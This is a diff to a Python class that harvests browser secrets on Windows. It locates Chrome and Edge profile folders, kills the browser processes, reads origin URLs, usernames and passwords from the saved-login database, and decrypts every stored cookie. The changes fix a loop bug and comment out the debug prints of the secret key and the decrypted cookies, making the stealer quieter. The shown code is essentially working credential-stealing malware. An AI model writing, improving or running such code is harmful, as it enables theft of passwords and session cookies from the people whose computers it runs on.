@@ -11,12 +11,12 @@ from datetime import datetime, timedelta
 class browser:
     def __init__(self):
         self.homepath = os.environ['USERPROFILE']+r"\AppData\Local"
-        self.browsers=[
-                       ["chrome.exe",self.homepath + r"\Google\Chrome\User Data"],
-                       ["msedge.exe",self.homepath + r"\Microsoft\Edge\User Data"],
-                       
-                    ]
-        for i in self.browsers:
+        self.browsers = [
+            ["chrome.exe", self.homepath + r"\Google\Chrome\User Data"],
+            ["msedge.exe", self.homepath + r"\Microsoft\Edge\User Data"],
+        ]
+
+        for i in self.browsers.copy():
             if not os.path.exists(i[1]):
                 self.browsers.remove(i)
             else:
@@ -61,7 +61,7 @@ class browser:
                     self.KillBrowser(browser_name)
                     conn = self.GetDBConnection(chrome_path_login_db,"Loginvault.db")
                     if(secret_key and conn):
-                        print(secret_key)
+                        # print(secret_key)
                         cursor = conn.cursor()
                         cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                         for index,login in enumerate(cursor.fetchall()):
@@ -102,7 +102,7 @@ class browser:
         for browser_name,browser_path,secret_key in self.browsers:
             try:
                 folders = [element for element in os.listdir(browser_path) if re.search("^Profile*|^Default$",element)!=None]
-                print(folders)
+                # print(folders)
                 for folder in folders:
                     cookie_db = os.path.normpath(r"%s\%s\Network\Cookies"%(browser_path,folder))
                     self.KillBrowser(browser_name)
@@ -118,7 +118,7 @@ class browser:
                             creation_utc = str(self.GetDatetime(creation_utc))
                             last_access_utc = str(self.GetDatetime(last_access_utc))
                             expires_utc = str(self.GetDatetime(expires_utc))
-                            print(f"host_key: {host_key}, name: {name}, decrypted_value: {decrypted_value}, creation_utc: {creation_utc}, last_access_utc: {last_access_utc}, expires_utc: {expires_utc}")
+                            # print(f"host_key: {host_key}, name: {name}, decrypted_value: {decrypted_value}, creation_utc: {creation_utc}, last_access_utc: {last_access_utc}, expires_utc: {expires_utc}")
                             cookies.append([browser_name,host_key, name, decrypted_value, creation_utc, last_access_utc, expires_utc])
                         cursor.close()
                         conn.close()
